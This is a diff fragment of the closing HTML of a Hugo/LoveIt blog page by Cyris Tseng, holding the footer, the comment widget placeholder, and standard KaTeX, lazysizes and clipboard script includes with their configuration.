+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.120.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://blog.cyris.tw" target="_blank">Cyris Tseng</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"Comment 💬","lightTheme":"github-light","repo":"yctseng1227/blog-comments"}},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
